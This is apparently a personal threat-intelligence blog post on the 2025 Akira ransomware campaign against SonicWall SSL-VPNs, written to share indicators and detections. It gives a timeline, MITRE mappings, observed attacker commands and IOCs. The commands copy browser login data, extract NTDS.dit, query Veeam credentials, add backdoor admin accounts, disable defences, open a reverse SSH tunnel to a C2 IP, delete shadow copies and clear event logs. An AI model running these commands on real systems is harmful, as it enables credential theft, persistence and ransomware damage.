Before I start just wanted to say a huge thank you to all those who put the effort into the blogs that have gone out already about this Akira campaign.  There were a lot of great blogs which show how rampant this was and helps us paint a picture of what they do.  I was going to try do this as last minute bsides talk but I ran out of time unfortunately.

The goal of this blog is to convey a timeline, share observations and discuss methods to detect this activity early.  This blog is a personal research blog which contains publicly available indicators and is for the community <3

<br>

## Timeline

It's been a tough few months for those with SSL-VPNs as some of them have been being heavily targeted by ransomware operators using Akira ransomware. The real cluster of activity started around the end of July with an uptick in SSL-VPN compromises being reported by MDR vendors before a notice was shortly published by SonicWall. A visual of this increase can be observed in the diagram shared in the first Huntress blog.  It was not just the Sonicwalls that this group has been targeting though, they have also been compromising Watchguard and Cisco ASA vpns as well(ZenSec). With this huge uptick in compromises the hypothesis of a zero-day was being thrown around, as the threat actors were observed using an over privileged LDAP bind or service account used by the SonicWall device.:

<br>
- 1/8/25 - Arctic Wolf publishes initial report of uptick in compromises https://arcticwolf.com/resources/blog/arctic-wolf-observes-july-2025-uptick-in-akira-ransomware-activity-targeting-sonicwall-ssl-vpn/
- 4/8/25 - Huntress blog released (https://www.huntress.com/blog/exploitation-of-sonicwall-vpn)
- 4/8/25 - Sonicwall Notice published (https://www.sonicwall.com/support/notices/gen-7-and-newer-sonicwall-firewalls-sslvpn-recent-threat-activity/250804095336430)
- 5/8/25 - Guidepoint flags Malicious Drivers (https://www.guidepointsecurity.com/blog/gritrep-akira-sonicwall/)
- 5/8/25 - Field Effect blog released (https://fieldeffect.com/blog/update-akira-ransomware-group-targets-sonicwall-vpn-appliances)

After the initial wave some more reporting occurred with Australia being targeted and some additional blogs from Zensec and DarkTrace
- 10/9/25 - ACSC alert of exploitation in Australia https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/ongoing-active-exploitation-of-sonicwall-ssl-vpns-in-australia
- 10/9/25 - rapid7 blog released (https://www.rapid7.com/blog/post/dr-akira-ransomware-group-utilizing-sonicwall-devices-for-initial-access/)
- 19/9/25 - Zensec blog released (https://zensec.co.uk/blog/unmasking-akira-the-ransomware-tactics-you-cant-afford-to-ignore/)
- 26/9/25 - Arctic wolf relases another blog (https://arcticwolf.com/resources/blog/smash-and-grab-aggressive-akira-campaign-targets-sonicwall-vpns/)
- 9/10/25 - Darktrace blog released (https://www.darktrace.com/blog/inside-akiras-sonicwall-campaign-darktraces-detection-and-response)

Then there was more bad news with a threat actor getting access to Sonicwall's cloud backup of customer configs.
- 17/9/25 - Initial brief by Sonicwall on compromise (https://www.cisa.gov/news-events/alerts/2025/09/22/sonicwall-releases-advisory-customers-after-security-incident)
- 22/9/25 - CISA shares Sonicwall Advisory https://www.cisa.gov/news-events/alerts/2025/09/22/sonicwall-releases-advisory-customers-after-security-incident
- 8/10/25 - Sonicwall updates a different blog that mandiant found access to firewall conf file for all customers using the cloud backup service.
- Huntress blog (https://www.huntress.com/blog/sonicwall-sslvpn-compromise)

<br>

## A not so Zero Day
Despite concerns that it was a zero day, SonicWall published guidance that these compromises were actually the result of an older vulnerability: CVE-2024-40766 https://nvd.nist.gov/vuln/detail/cve-2024-40766
It is an improper access control vulnerability in SonicOs management access, which can result in unauthorized resource access.
It affects SonicWall Firewall Gen 5 and Gen 6, as well as Gen 7 devices with SonicOS 7.01-5035 and older.

The remediation guidance was updated by SonicWall which recommended updating the firmware version and resetting all local user account passwords for accounts with SSL VPN access.

They have a great table if you are unsure if your platform and version pair is affected:
https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2024-0015

It is interesting that there was such a gap between the publishing of this vulnerability and the compromises of these SonicWalls, did they grab credentials earlier and then once they were happy they had a good amount start compromising the networks?

<br>

## Pirates of the Akira-bean
Now Akira is not a new name and it has been around for a while, with indicators of being a descendent of Conti. If you want to learn more about their links to Conti I recommend reading this great blog by Bushido Token.
- https://blog.bushidotoken.net/2023/09/tracking-adversaries-akira-another.html

This covers a lot of it, which is that they are a Ransomware As A Service(RAAS) group and target Windows, Hyper-V, ESXi and Linux Vms.

They have maintained the same TTPs for a while, particularly how they target ESXi servers.  A blog from CyberCx shows how they attack a network with EDR installed and spin up their own VM on a hypervisor to execute the ransomware payload:
  - https://cybercx.com.au/blog/akira-ransomware/

They also move particularly quickly in an environment and can ransom a business in a few hours. 

Mandiant shared in their Mtrends report that they track two clusters of Akira:
 - UNC5277

    - Leverages stolen credentials for vpns, uses publicly available tools for recon, priv esc and persistence.
    - Exploits CVE-2023-27532 (https://github.com/sadshade/veeam-creds)
    - Has used winscp for exfil
    
 - UNC5280

    - Leveraged valid vpn credentials to gain access
    - Deletes forensic artifacts
    - Used metasploit
    - ssh connection via FreeSShd or mobaxterm


From the blogs listed above there are a lot of different tactic, techniques and procedures(TTPs) which I have tried to pull together below.

<br>

## MITRE MAPPING
For a quick high overall view we can break down the TTPs to the following (Much thanks goes to all the hard work of those who added these to their blogs <3). From the blogs I listed I recommend checking out the ZenSec mitre view as it graphs out initial access to impact in a flow chart which is such a great readable way of doing it.

~~~plaintext
Reconnaissance          
                        T1590.002: Gather Victim Network Information: DNS (Reverse DNS Sweep)
                        T1590.005: Gather Victim Network Information: IP Addresses (Network Range Scan)
                        T1595 : Active Scanning  (port scanning)
Initial Access: 	    
                        T1190 : Exploit Public-Facing Application
                        T1133: External Remote Services	(VPN)
                        T1078: Valid Accounts (Compromised Creds)
Defense Evasion:        
                        T1562: Impair Defenses (Drivers, Defender disabling, firewall commands)
                        T1070: Indicator Removal (file deletion, log clearing)
Credential Access	    
                        T1555: Credentials from Password Stores (Veeam-get-creds github.com/sadshade/veeam-creds)
                        T1003: OS Credential Dumping (LSASS)
                        T1003.003: NTDS
                        T1110.001: Brute Force: Password Guessing (Internal Brute)
                        T1649:  Steal or Forge Authentication Certificates (DCE-RPC ICertPassage request to download certificate)
Persistence	            
                        T1136: Create Account 
                        T1112: Modify Registry (Disable UAC)
Privilege Escalation	
                        T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control (Disable UAAC)
                        T1068: Exploitation for Privilege Escalation (CVE-2023-27532, CVE-2024-40711)
Discovery	            
                        T1018: Remote System Discovery
                        T1046: Network Service Discovery (Port scanners)
                        T1135: Network Share Discovery (Sharpshares, invoke-sharefinder)
                        T1083: File and Directory Discovery
                        T1087.001/002:  Account Discovery: Domain & Local Account (written to .csv)
                        T1673: Virtual Machine Discovery (RVTools)

Lateral Movement	    
                        T1021.001: Remote Services: Remote Desktop Protocol
                        T1021.004: Remote Services: SSH
                        T1021.006: Remote Services: Windows Remote Management
                        T1550.002: Use Alternate Authentication Material: Pass the Hash
                        T1550.003: Use Alternate Authentication Material: Pass the Ticket
                        T1570: Lateral Tool Transfer (PSExec)
Collection	            
                        T1560.001: Archive Collected Data: Archive via Utility (WinRar)
                        T1074: Data Staged
Command and Control	    
                        T1102: Web Service (Cloudflared)
                        T1219: Remote Access Tools (RMM tools)
                        T1572: Protocol Tunneling (SSH tunnels)
                        T1105: Ingress Tool Transfer (vmwaretools ex)
                        T1573:  Encrypted Channel (encypted traffic)
Exfiltration            
                        T1041: Exfiltration Over C2 Channel (Exfil to C2 observed by DarkTrace)
                        T1048: Exfiltration Over Alternative Protocol (SSH)
Impact                  
                        T1486: Data Encrypted for Impact (ransomware)
                        T1657: Financial Theft (double extortion)
                        T1490: Inhibit System Recovery (delete shadows)
                        T1561: Disk Wipe (NAS devices/backups)
~~~

# Tools
<br>
**Discovery**:
- Softperfect Network Scanner
- Advanced_IP-scanner
- Adcanved_Port_Scanner
- Powerview
- SharpShares
- Grixba
- PingCastle
- SharpHound
- RVTools
- ldapdomaindump
<br>

**Lateral Movement**
- NetExec
- PsExec
- Impacket
- Mobaxterm
<br>

**Exfil and Staging**
- winrar
- filezilla
- rclone
- 7zip
- bitwise ssh client
<br>

**Persistence**
- anydesk
- rustdesk
- screenconnect
- ssh
- Ligolo-ng tunnel util
- Cobalt Strike
<br>

**Credential Access**
- veeam-creds ps1/exe
 - NTDS.dit , system hive extraction
 - Mimikatz
 - DCSync
<br>

**Impact**
- Akira Ransomware
<br>

# Observations 
**Initial Access**
 - SSl-VPN exploitation
 - Authentications from VPS (Listed ASNs at the bottome)
<br>


**Discovery**
 - Netscan
 - Advanced_IP-Scanner (downloads or documents)
 - Advanced_Port_Scanner
 - `Nltest /trusted_domains`
 - ping
 ```
Install-WindowsFeature RSAT-AD-PowerShell
Get-ADComputer -Filter * -Property * | Select-Object Enabled,
DNSHostName, IPv4Address, OperatingSystem, Description  >
C:\programdata\[redacted].txt
```
 - `cmd.exe /Q /c nltest /domain_trusts 1> \\Windows\\Temp\\ysKBfL 2>&1`
 - `cmd.exe /Q /c quser 1> \\127.0.0.1\ADMIN$\__1754125023.3698354 2>&1`
 - `net group "Domain admins" /dom`
 - Adsubnets.csv, adGroups.tx, AdOUs.csv, AdCOmputers.txt, adUsers.txt and AdTrusts.txt (in weird path like C:\ or programdata)
 ```
   Get-ADUser -Filter * -Properties * | Select-Object Enabled, CanonicalName,
   CN, Name, SamAccountName, MemberOf, Company, Title, Description, Created,
   Modified, PasswordLastSet, LastLogonDate, logonCount, Department,
   telephoneNumber, MobilePhone, OfficePhone, EmailAddress, mail,
   HomeDirectory, homeMDB > C:\ProgramData\AdUsers.txt
```
 
```
   Get-ADUser -Filter * -Properties * | Select-Object Enabled, CanonicalName,
   CN, Name, SamAccountName, MemberOf, Company, Title, Description, Created,
   Modified, PasswordLastSet, LastLogonDate, logonCount, Department,
   telephoneNumber, MobilePhone, OfficePhone, EmailAddress, mail,
   HomeDirectory, homeMDB >> C:\ProgramData\REDACTED_Users.txt
```
 
 ```
   Get-ADComputer -Filter * -Property * | Select-Object Enabled, Name,
   DNSHostName, IPv4Address, OperatingSystem, Description, CanonicalName,
   servicePrincipalName, LastLogonDate, whenChanged, whenCreated >>
   C:\ProgramData\REDACTED_Comps.txt
```
 - Powerview
 - SharpShares
   - `C:\programdata\SharpShares.exe /ldap:all /filter:netlogon,ipc$,print$
/threads:1000 /outfile:C:\programdata\tb.txt`
 
   -NOTEPAD.EXE C:\ProgramData\tb.txt
 - Grixba (https://fieldeffect.com/blog/grixba-play-ransomware-impersonates-sentinelone, https://www.security.com/threat-intelligence/play-ransomware-volume-shadow-copy)
 - PingCastle
 - Sharphound
 - VirtualMachine enumeration was observed with RVTools
 - ldapdomaindump

<br>

**Lateral Movement**
 - RDP for hosts
 - SSH for esxi / Nas
 - NetExec
 - PsExec
 - Impacket atexec.py
   - `C:\Windows\System32\cmd.exe /Q /c quser 1> \Windows\Temp\RANDOMIZED_STRING 2>&1 (Example of impacket)`
 - MobaXterm
 - WinRm using Ruby client
<br>

 **Exfil and staging**
 - `"C:\Program Files\WinRAR\WinRAR.exe" a -ep1  -scul -r0 -iext -imon1 -- . X:\[Redacted]`
 - `c:\ProgramData\winrar.exe`
 - `C:\ProgramData\winrar-x64-712.exe`
 - `winrar.exe a -m0 -v3g -tn365d -n*.txt -n*.pdf -n*.xls -n*.doc -n*.xlsx -n*.docx -n*.BAK -n*.MDB  "C:\Data" "\\"<redacted>"`
 - `C:\ProgramData\shares.txt`
 - `"C:\Program Files\FileZilla FTP Client\fzsftp.exe" -v`
 - Rclone
 - 7zip
 - bitwise ssh client
 - browser (easyupload.io)
<br>

**Persistence**
- `"C:\Windows\System32\msiexec.exe" /i "C:\ProgramData\OpenSSHa.msi"`
- `"C:\Windows\system32\net.exe" user lockadmin Msnc?42da /add`
- `"C:\Windows\system32\reg.exe" add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v commuser /d 0 /f`
- `net user [REDACTED] VRT83g$%ce /add`
- `net localgroup Administrators [redacted] /add`
- `net localgroup "Remote Desktop Users" [redacted] /add`
- `net  group "Domain Admins" azuresync /add`
- `cmd.exe /Q /c net user backupSQL Password123$ /add /dom 1> \\Windows\\Temp\\tinhLg 2>&1`
- `cmd.exe /Q /c net group "Domain Admins" backupSQL  /dom /add 1> \Windows\Temp\NDqyOI 2>&1`
- Cloudflared tunnel  (`C:\programdata\ssh\cloudflared.exe`)
   - `New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server(sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22`
 
cloudflared[.]exe service install REDACTED
- `C:\ProgramData\cloudflared_msi_install.log.`
_BASE64_TOKEN
- Chrome remote desktop
- Anydesk

```
“C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -command
"(new-object
System.Net.WebClient).DownloadFile('hxxp://download[.]anydesk[.]com/AnyDesk
.exe';, 'C:\ProgramData\AnyDesk.exe')"
```

- rustdesk

```
"C:\Windows\System32\cmd.exe" /C
C:\Users\ADMINI~1\AppData\Local\Temp\RustDesk_install.bat
 
sc create RustDesk binpath= "\"C:\Program Files\RustDesk\RustDesk.exe\"
--import-config
\"C:\Users\Administrator\AppData\Roaming\RustDesk\config\RustDesk.toml\
"" start= auto DisplayName= "RustDesk Service"
```

- ScreenConnect
- Reverse shells on esxi (python)
- Ligolo-ng tunnel util
- Cobalt Strike
- Payloads pulled from temp.sh
- ssh
`ssh -R 5555 root@170.130.165[.]42`
- `netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow`
- `New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22`

<br>

Credential Access:
 - `cmd.exe /Q /c copy \"C:\Users\[redacted]\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "C:\Windows\Temp\1753954887.8450267"`
 - `"C:\Windows\system32\wbadmin.exe" start backup -backupTarget:\\localhost\c$\ProgramData\ -include:C:\Windows\NTDS\NTDS.dit C:\Windows\System32\config\SYSTEM C:\Windows\System32\config\SECURITY -quiet`
 - `Veam-get-creds.ps1`
 - https://github.com/byt3n33dl3/NetExec/blob/8dfd17e4500523a154467ae9c85f0a41c1a16813/nxc/data/veeam_dump_module/veeam_dump_postgresql.ps1
 - `VeeamHax.exe`
 - NTDS.dit , system hive extraction
 - Mimikatz
 - DCSync
 - DCE-RPC requestt to the ICertPassage Service (UnPAC the Hash)
 - veeam credentials via `sqlcmd -S localhost\REDACTED_USERNAME -E -y500 -s ";" -Q
"SELECT * FROM [VeeamBackup].[dbo].[Credentials];"`

<br>

Disabling Security software
- `Users\REDACTED\AppData\Local\Temp\hlpdrv.sys`
- `Users\REDACTED\AppData\Local\Temp\rwdrv.sys`
- `"C:\Windows\system32\SystemSettingsAdminFlows.exe" Defender DisableEnhancedNotifications 1`

- Due to privs can disable securyity via control panel
- Powershell scripts to set-mppreference options set to disable or $true depending
- Created VMs to avoid EDR and encrypt via SMB were observed in hyperv environments
- Disabling security in Nas products
- Disabling UAC for local accounts
```
reg add
\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Pol
icies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
- BYOVD and ran consent.exe from EDR folders which loaded wmsgapi.dll or msimg32.dll which loaded the driver located in temp to disable edr
- `C:\Users\REDACTED\AppData\Local\Temp\churchill_driver.sys`
- `C:\Users\REDACTED\AppData\Local\Temp\rwdrv.sys`
- `C:\Users\REDACTED\AppData\Local\Temp\hlpdrv.sys`
- HyperV check using a bat script
- reg query

```
"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios
\HypervisorEnforcedCodeIntegrity" > nul 2>&1
if %ERRORLEVEL% neq 0 (
   echo HVCI registry key does not exist. HVCI is NOT enabled. ALL IS GOOD!
   exit /b
)
```

<br>


Impact
- `"C:\WINDOWS\system32\vssadmin.exe" delete shadows /all /quiet`
- `powershell.exe -Command Get-WmiObject Win32_Shadowcopy | Remove-
WmiObject`
- `w.exe  -p=\\[redacted]\C$ -n=1`
- `w.exe  -n=3 -p=X:\ -dellog`
- `akira.exe`
- `lck.exe`
- `lock.exe`
- `locker.exe`
- `pr.exe`
- `n.exe`
- `s.exe`
- `aki.exe`
- `win.exe`
- `chmod +x` befor running esxi encryptor
- `esx -n -p -fork`
- `winlocker.exe`
- `hello.exe`
- `powershell.exe -ep bypass -Command "Get-WinEvent -ListLog * | where { $_.RecordCount } | ForEach-Object -Process{ [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }"`
- target backups, format/wip disks/ factory reset
- differy scenarios:
   1: Virtual Disk level - vmdks are encrypted and laptops/desktops left unencypted
   2: Full environment encrypted (OS and vmdks)
   3: In-guest encrypion only - encrypts contents of vms rather than the underlying disk files
- windows locker writes log files like:
 -  `Log-DD-MM-YYYY-HH-MM-SS.txt`.
- `.akira` appended to files
- dumps `akira_readme.txt` within each folder

<br>

Unsure:
Elf `vmwaretools` (potential esxi ransomware file observed being pulled by TA from Darktrace)
`C:\ProgramData\1.bat` (potential defender disabling mentioned in Zensec Blog)
`C:\ProgramData\2.bat` (Potential AD powershell discovery mentioned in Zensec blog)

<br>

# Prepare/prevent

- Enforce least privilege on ldap bind account (dont make it a Domain Admin pleeasee)
- Segment network so critical servers/services (File Server, Backups, Database servers, hypervisor) are not easily accessible from vpn range (depends on your use cases but if you can this is not a bad idea).  Offsite backups are your friend, even better if they aren't AD joined
- Application control to prevent unwanted RMM tools from running
- Enforce MFA on VPN
- Keep hardware up to date and follow remediation advice for vulnerabilities
- Have 24/7 coverage one way or another, most ransomware groups perform activity overnight so a sysadmin is less likely to be awake 

<br>

# Detection

- syslog from esxi to detect anomalous activity (ssh enabled, mass VMs going offline, new vms being created, flurry of admin activity over night)
- syslog from ssl-vpn and detect auths from VPS servers / anomalous ip geolocation for user
- detect installation of RMM tools in your environment
- Use a network sensor to detect anomalous traffic on the internal network (port scan, suspicious smb activity, beacon, exfil)
- detect rmms or file transfer tools running from programdata
- processes, file creations and network rules for the activity listed above ^^^

<br>

# IOCS:


### Hostnames

DESKTOP-A2S6P81
DESKTOP-A6MVCI0
DESKTOP-EDE0RR5
DESKTOP-EEKR377
DESKTOP-HPLM2TD
DESKTOP-NTOTKE1
DESKTOP-SBOHBN9
DESKTOP-UOQCGGJ
SERVER
WIN
WIN-0NBN6G381L0
WIN-2016-TEST
WIN-5VVC95LFP2G
WIN-EES13C2CG49
WIN-F48JBFDRB2V
WIN-V1L65ED9I55
WINUTIL
kali

<br>

### Exfil IP address:
- 66.165.243[.]39
- 107.155.69[.]42
- 107.155.93[.]154

<br>

### Possible c2 and file downloads observed by DarkTrace:
- 137.184.126[.]86 – IP Address – Possible C2 endpoint
- 85.239.52[.]96 – IP Address – Likely C2 endpoint
- hxxp://85.239.52[.]96:8000/vmwarecli  – URL – File download
- hxxp://137.184.126[.]86:8080/vmwaretools – URL – File download

<br>

### Users created
backupSQL
lockadmin
sqlbackup
veean

<br>

### passwords used
Password123$
Msnc?42da
VRT83g$%ce

<br>

### Drivers:
hlpdrv.sys bd1f381e5a3db22e88776b7873d4d2835e9a1ec620571d2b1da0c58f81c84a56	
rwdrv.sys  16f83f056177c4ec24c7e99d01ca9d9d6713bd0497eeedb777a3ffefa99c97f0

<br>

### Network IOCS

```
ASN , ORG
AS199959 , CROWNCLOUD
AS395092 , Shock Hosting LLC
AS62240 , Clouvider Limited
AS64236 , UnReal Servers, LLC
AS55286, Server Mania Inc
AS19318, Interserver  Inc
AS63018, Dedicated.com
AS29802, HIVELOCITY, Inc
AS36352, HostPapa
AS53363, STARK INDUSTRIES SOLUTIONS LTD
AS30860, Virtual Systems LLC
AS44477, PQ HOSTING PLUS S.R.L.

ASN/CIDR hosting adversary infrastructure.
AS62240 - Clouvider - 45.86.208.0/22
AS62240 - Clouvider - 77.247.126.0/24
AS23470 - ReliableSite LLC - 104.238.204.0/22
AS23470 - ReliableSite LLC - 104.238.220.0/22
AS174 - COGENT-174 - 181.215.182.0/24
AS62240 - Clouvider - 193.163.194.0/24
AS62240 - Clouvider - 193.239.236.0/23
AS62240 - Clouvider - 194.33.45.0/24

Indicator	ASN	Type	Description
155.117.117[.]34	AS215703 – ALEXANDRU VLAD trading as FREAKHOSTING	IPv4 Address	VPN Client IP
45.66.249[.]93	AS62005 – Bluevps Ou	IPv4 Address	VPN Client IP
193.239.236[.]149	AS62240 – Clouvider Limited	IPv4 Address	VPN Client IP
193.163.194[.]7	AS62240 – Clouvider Limited	IPv4 Address	VPN Client IP
194.33.45[.]194	AS62240 – Clouvider Limited	IPv4 Address	VPN Client IP
31.222.247[.]64	AS62240 – Clouvider Limited	IPv4 Address	VPN Client IP
62.76.147[.]106	AS62240 – Clouvider Limited	IPv4 Address	VPN Client IP
77.247.126[.]239	AS62240 – Clouvider Limited	IPv4 Address	VPN Client IP
83.229.17[.]123	AS62240 – Clouvider Limited	IPv4 Address	VPN Client IP
83.229.17[.]135	AS62240 – Clouvider Limited	IPv4 Address	VPN Client IP
83.229.17[.]148	AS62240 – Clouvider Limited	IPv4 Address	VPN Client IP
45.55.76[.]210	AS14061 – Digitalocean  Llc	IPv4 Address	VPN Client IP
38.114.123[.]167	AS63023 – Gthost	IPv4 Address	VPN Client IP
38.114.123[.]229	AS63023 – Gthost	IPv4 Address	VPN Client IP
107.155.93[.]154	AS29802 – Hivelocity  Inc.	IPv4 Address	VPN Client IP
144.168.41[.]74	AS29802 – Hivelocity  Inc.	IPv4 Address	VPN Client IP
91.191.214[.]170	AS29802 – Hivelocity  Inc.	IPv4 Address	VPN Client IP
193.29.63[.]226	AS63473 – Hosthatch  Llc	IPv4 Address	VPN Client IP
23.94.54[.]125	AS36352 – Hostpapa	IPv4 Address	VPN Client IP
185.33.86[.]2	AS202015 – Hz Hosting Ltd	IPv4 Address	VPN Client IP
79.141.160[.]33	AS202015 – Hz Hosting Ltd	IPv4 Address	VPN Client IP
79.141.173[.]235	AS202015 – Hz Hosting Ltd	IPv4 Address	VPN Client IP
185.181.230[.]108	AS60602 – Inovare-Prim Srl	IPv4 Address	VPN Client IP
207.188.6[.]17	AS396356 – Latitude.Sh	IPv4 Address	VPN Client IP
107.175.102[.]58	AS131199 – Nexeon Technologies  Inc.	IPv4 Address	VPN Client IP
185.174.100[.]199	AS8100 – Quadranet Enterprises Llc	IPv4 Address	VPN Client IP
45.56.163[.]58	AS8100 – Quadranet Enterprises Llc	IPv4 Address	VPN Client IP
104.194.11[.]34	AS23470 – Reliablesite.Net Llc	IPv4 Address	VPN Client IP
104.194.8[.]58	AS23470 – Reliablesite.Net Llc	IPv4 Address	VPN Client IP
104.238.205[.]105	AS23470 – Reliablesite.Net Llc	IPv4 Address	VPN Client IP
172.86.96[.]42	AS14956 – Routerhosting Llc	IPv4 Address	VPN Client IP
144.172.110[.]103	AS14956 – RouterHosting LLC	IPv4 Address	VPN Client IP
144.172.110[.]37	AS14956 – RouterHosting LLC	IPv4 Address	VPN Client IP
144.172.110[.]49	AS14956 – RouterHosting LLC	IPv4 Address	VPN Client IP
185.168.208[.]102	AS21249 – GLOBAL CONNECTIVITY SOLUTIONS LLP	IPv4 Address	VPN Client IP
172.96.10[.]212	AS64236 – Unreal Servers  Llc	IPv4 Address	VPN Client IP
107.158.128[.]106	AS62904 – Eonix Corporation	IPv4 Address	VPN Client IP
170.130.165[.]42	AS62904 – Eonix Corporation	IPv4 Address	Command and Control
162.210.196[.]101	AS30633 – Leaseweb Usa  Inc.	IPv4 Address	Exfiltration
206.168.190[.]143	AS14315 – 1gservers  Llc	IPv4 Address	Exfiltration
```
<br>

### MISC IOCs
<br>
**cloudflared token**
- eyJhIjoiY2ZkNzlkNDEyYWFh**REDACTED**TVdZeE1USTJaR1E0WlRsaiJ9
<br>
This is unrelated but you see much of the same ttps in this DFIR report which came out just as the activity was ramping up
- https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira/







 


 
